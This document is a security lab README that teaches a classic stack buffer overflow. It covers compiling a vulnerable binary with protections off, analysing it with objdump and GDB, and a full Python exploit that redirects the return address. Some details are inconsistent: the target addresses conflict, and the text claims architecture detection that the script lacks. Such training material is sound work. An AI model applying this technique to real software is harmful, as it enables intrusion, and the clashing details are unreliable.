# CyberLabs: Stack Buffer Overflow Control Flow Laboratory

**Module Code:** CL-MEM-002

**Level:** Intermediate / Advanced

**Topic:** Memory Corruption Vulnerabilities

## Laboratory Purpose

This laboratory, prepared for the CyberLabs education platform, addresses the classic **Stack Buffer Overflow** vulnerability and how this vulnerability can be used to take control of program flow. Participants are expected to gain the following competencies by the end of this laboratory:

  * Understanding how Stack Buffer Overflow vulnerability affects the program's return address.
  * Compiling programs with flags that facilitate exploit development (`-fno-stack-protector`, `-z execstack`, `-no-pie`) using the `g++` compiler.
  * Performing static analysis on a program using `objdump` to identify function addresses.
  * Performing dynamic analysis using `gdb` (GNU Debugger), crashing the program, and analyzing stack state.
  * Using commands like `x/32gx $rbp` within GDB to directly examine data on the stack and verify the offset value needed for exploitation.

## Difficulty Levels

## ðŸŸ¢ **EASY WAY: With Debug Symbols**
```bash
# Add -g flag in test_lab.sh file
g++ -m64 -fno-stack-protector -z execstack -no-pie -g -o vulnerable_code vulnerable_code.cpp
```
- Easier analysis with debug symbols
- `p &variable` commands work in GDB
- Ideal for educational purposes

## ðŸ”´ **HARD WAY: Without Debug Symbols (Default)**
```bash
# Current compilation (no debug symbols)
g++ -m64 -fno-stack-protector -z execstack -no-pie -o vulnerable_code vulnerable_code.cpp
```
- Closer to real world
- Requires `info functions`, `disassemble` commands
- Production binaries don't have debug symbols

## Installation and Execution Steps

### 1. Compiling the Vulnerable Code

The first step is to compile the C++ source code using specific flags. These flags disable some protection mechanisms in modern operating systems, making exploitation more predictable.

```bash
g++ -m64 -fno-stack-protector -z execstack -no-pie -o vulnerable_code vulnerable_code.cpp
```

  * `-m64`: Compiles the program as 64-bit.
  * `-fno-stack-protector`: Disables "canary" values used to detect stack overflows.
  * `-z execstack`: Marks the stack region as executable. This is necessary for scenarios where shellcode is injected into the stack and executed.
  * `-no-pie`: Disables Position Independent Executable (PIE) feature. This keeps program and function addresses constant on each run.

### 2. Static Analysis: Finding Target Function Address

Our goal is to redirect the program's flow to a function that would not normally be called (e.g., `target_function`). For this, we need to find the memory address of this function using the `objdump` tool.

```bash
objdump -d ./vulnerable_code | grep target_function
```

This command will give you the starting address of `target_function`. For example:
`0000000000401186 <target_function>:`
In this case, our target address will be `0x401186`.

### 3. Dynamic Analysis: Triggering the Vulnerability with GDB

Now we will examine the existence and impact of the vulnerability live using GDB (GNU Debugger).

```bash
gdb vulnerable_code
```

After the GDB environment opens, run the program with special input that will overflow the buffer. The `A` character (HEX `0x41`) is frequently used for padding purposes as it is easily recognizable in memory. Let's send a 72-byte sequence of 'A'.

```
(gdb) run <<< $(python -c 'print("A"*72)')
```

The program will crash with a "Segmentation fault" error because the return address is overwritten with an invalid address like `0x4141414141414141`. This shows we are very close to taking control.

### 4. Examining the Stack: `x/32gx $rbp`

Examining the state of the stack at the moment of crash is the most critical step for writing exploitation code. The `x/32gx $rbp` command allows us to examine memory starting from where the stack pointer (`$rbp`) points at the moment of crash.

  * `x`: e**x**amine command.
  * `/32gx`: Show 32 **g**iant word (64-bit) data in he**x** format.

```
(gdb) x/32gx $rbp
```

The output of this command will be similar to:

```
0x7fffffffe318: 0x4141414141414141      0x00007ffff7a2d830
0x7fffffffe328: 0x00000000004011e9      0x0000000100000000
...
```

**How do we interpret this output?**

  * `0x7fffffffe318:`: Memory address on the stack.
  * `0x4141414141414141`: This is exactly where the return address should be. The last 8 bytes of our 72-byte 'A' input have landed here. This confirms that we need **72 bytes of padding** to control the return address.

### 5. Developing and Running the Exploit

Now we have all the information:

1.  **Required Padding Size:** 72 bytes.
2.  **Target Address:** The address we found with `objdump` (e.g., `0x401186`).

Using this information, we can write our exploit. Our payload will be `[ 72 byte 'A' ] + [ 8 byte Target Address ]`.

```python
# exploit_final.py
import struct
import subprocess
import sys

# Name of the compiled vulnerable program
VICTIM_PROGRAM = "./vulnerable_code"

# --- FIND THIS ADDRESS WITH GDB ON YOUR OWN SYSTEM ---
# Example: 0x4011e9
TARGET_ADDRESS = 0x401146  # <-- UPDATE THIS LINE WITH THE ADDRESS YOU GOT FROM GDB

# Calculated padding size for 64-bit architecture
# [64 byte buffer] + [8 byte saved RBP] = 72 bytes
PADDING_SIZE = 72

def main():
    """
    Main function that initiates the exploitation process.
    """
    print("--- [ATTACKER] Stack Overflow Exploit Started ---")
    
    if TARGET_ADDRESS == 0x4011e9:
        print("\n[!] WARNING: Don't forget to update TARGET_ADDRESS with your system's address!\n")

    print(f"[*] Target Address: {hex(TARGET_ADDRESS)}")
    print(f"[*] Padding Size: {PADDING_SIZE}")
    
    # Create payload: [ 72 byte padding ('A') ] + [ 8 byte target address ]
    padding = b'A' * PADDING_SIZE
    
    # Pack address in 64-bit (8 byte) little-endian format
    overwrite_address = struct.pack("<Q", TARGET_ADDRESS)
    
    payload = padding + overwrite_address
    
    print(f"[*] Payload created as {len(payload)} bytes.")
    
    try:
        # Start the vulnerable program as a subprocess.
        # We connect pipes to write to stdin and read from stdout/stderr.
        p = subprocess.Popen(
            [VICTIM_PROGRAM], 
            stdin=subprocess.PIPE, 
            stdout=subprocess.PIPE, 
            stderr=subprocess.PIPE
        )
    except FileNotFoundError:
        print(f"\n[!] ERROR: '{VICTIM_PROGRAM}' not found. Did you compile the C++ code?")
        sys.exit(1)
        
    print("[*] Sending payload to victim program...")
    
    # Send payload to program's standard input and get output
    stdout_output_bytes, stderr_output_bytes = p.communicate(input=payload)
    
    # Convert output from bytes to string for easier processing
    stdout_output = stdout_output_bytes.decode('utf-8', errors='ignore')
    
    print("\n--- Output from Victim Program ---")
    print(stdout_output)
    print("------------------------------------")
    
    # Look for the keyword we determined in the program's output.
    if "CONTROL TAKEN" in stdout_output:
        print("\n[+] Vulnerability successfully exploited!")
    else:
        print("\n[-] Exploitation failed. Check the address or offset.")
        # We can also print stderr for debugging
        stderr_output = stderr_output_bytes.decode('utf-8', errors='ignore')
        if stderr_output:
            print("\n--- Error Output (stderr) ---")
            print(stderr_output)


if __name__ == "__main__":
    main()

```

When you run the exploit, you should see the success message defined in the `target_function` in the program's output. This means you have successfully taken control of the program's flow.

## Linux Compatibility

This lab is designed to work on both Linux and macOS systems:

### Compilation for Linux
```bash
# Special compilation script for Linux
./compile_linux.sh

# Or manual compilation
g++ -m64 -fno-stack-protector -z execstack -no-pie -o compiled/vulnerable_code source_code/vulnerable_code.cpp
```

### Requirements
- **Linux:** `g++`, `build-essential`, `libc6-dev`
- **macOS:** `g++` (Xcode Command Line Tools)
- **Python:** `python3`, `pwntools`

### Testing
```bash
# Run all tests
./test_lab.sh

# Run exploit
python3 source_code/exploit.py
```

The exploit automatically detects system architecture (32-bit/64-bit) and uses the appropriate packing function.
